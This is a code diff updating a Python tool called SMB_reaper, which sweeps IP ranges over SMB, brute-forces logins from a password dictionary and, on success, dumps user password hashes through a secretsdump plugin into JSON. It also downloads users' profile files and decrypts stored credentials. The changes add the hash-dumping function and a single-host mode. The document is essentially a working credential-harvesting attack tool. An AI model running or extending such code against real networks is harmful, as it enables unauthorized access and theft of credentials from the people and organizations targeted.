@@ -1,11 +1,12 @@
 #####################################
 #
 #  Made by SBR
-#  v0.8
+#  v1.0
 #####################################
 
 import os
 import argparse
+import json
 from tqdm import tqdm
 from itertools import product
 from passlib.hash import lmhash, nthash
@@ -13,7 +14,7 @@ from smb.SMBConnection import SMBConnection
 from parser_method import Parser
 from ipaddress import IPv4Network
 from datetime import datetime
-from plugins.secretsdump import Get_users_pass
+from plugins.secretsdump import Get_users_hashes
 from decrypt_method import Decrypt
 
 #########static variables############
@@ -22,6 +23,7 @@ server_name = 'PC'
 denied_usr = ['Все пользователи', 'Public', 'All Users', 'Default', 'Default User', '.', '..']
 data_folder = 'OUT'
 startup = True
+alone = False
 messages = []
 Users = []
 #####################################
@@ -57,13 +59,10 @@ def logger(msg):
 
 
 def parse_dict(path, flag):
-    temp_locker = list()
     with open(path, 'r', encoding='utf-8') as file:
         data = set(filter(None, file.read().split('\n')))
     if not flag:
-        for pare in data:
-            temp_locker.extend(pare.split(':'))
-        creds = set(product(temp_locker, repeat=2))
+        creds = set(product(data, repeat=2))
     else:
         creds = ['']
         creds.extend(set(data))
@@ -77,8 +76,21 @@ def _decrypt(use_decrypt):
             fp.write(f'{Decrypor.Decryptor()}')
 
 
+def Dump_hashes(path, data):
+    users = dict()
+    for i in data.values():
+        temp = i.split(':', maxsplit=2)
+        users[temp[0]] = temp[2][:-3]
+    with open(path, 'w', encoding='utf-8') as fp:
+        fp.write(json.dumps(users, sort_keys=True, indent=4, ensure_ascii=False))
+
+
 def main(share, domain, timeout, creds, target, use_decrypt, attempt=0):
-    start, stop = Get_range_IP(target)
+    if '/' in target:
+        start, stop = Get_range_IP(target)
+    else:
+        start = stop = target
+        alone = True
 
     if not os.path.exists(data_folder):
         os.mkdir(data_folder)
@@ -102,7 +114,7 @@ def main(share, domain, timeout, creds, target, use_decrypt, attempt=0):
                         for i in Users:
                             fp.write(f'{i}\n')
                     logger([f'Authentication successful - {start} with login = "{temp_pare[0]}" and password = "{temp_pare[1]}"\n\nSTART DOWNLOADING from {start}\n{"-" * 50}'])
-                    Get_users_pass(str(start), temp_pare[0], f'{lmhash.hash(temp_pare[1], encoding="utf-16le")}:{nthash.hash(temp_pare[1])}')
+                    Dump_hashes(f'{data_folder}/{str(start)}/hashes.txt', Get_users_hashes(str(start), temp_pare[0], f'{lmhash.hash(temp_pare[1], encoding="utf-16le")}:{nthash.hash(temp_pare[1])}'))
                     for i in range(len(Users)):
                         logger([f'\nDownloading for user - {Users[i]}\n{"=" * 50}'])
                         if not os.path.exists(f'{data_folder}/{str(start)}/{Users[i]}'):
@@ -127,7 +139,10 @@ def main(share, domain, timeout, creds, target, use_decrypt, attempt=0):
                     Users.clear()
         except:
             logger(['', f'Error connection - {start}'])
-        start += 1
+        if not alone:
+            start += 1
+        else:
+            break
         attempt = 0
     _decrypt(use_decrypt)
 
@@ -135,13 +150,13 @@ def main(share, domain, timeout, creds, target, use_decrypt, attempt=0):
 if '__main__' == __name__:
     args = argparse.ArgumentParser(
         prog='SMB_reaper',
-        description='This program collect useful credentials from SMB shares. The password and login in the dictionary are separated using ":"')
+        description='This program collect useful credentials from SMB shares')
     args.add_argument('-u', action='store', type=str, help='SMB login')
     args.add_argument('-p', action='store', type=str, help='SMB password')
     args.add_argument('-domain', action='store', type=str, help='SMB domain', default='WORKGROUP')
     args.add_argument('-target', action='store', type=str, help="Host's IP with CIDR (192.168.0.1/24)")
     args.add_argument('-timeout', type=float, help='SMB connection delay in second', default=1)
-    args.add_argument('--use-dict', action='store', type=str, help='Path to login:passwords dictionary combinations')
+    args.add_argument('--use-dict', action='store', type=str, help='Path to login/passwords dictionary')
     args.add_argument('-share', action='store', type=str, help='Share name', default='C$')
     args.add_argument('--auto-decrypt', action='store', type=str, help='Path to passwords dictionary')
     args.add_argument('--only-decrypt', action='store', type=str, help='Use only decrypt function from existed data (Need a dictionary with passwords)')
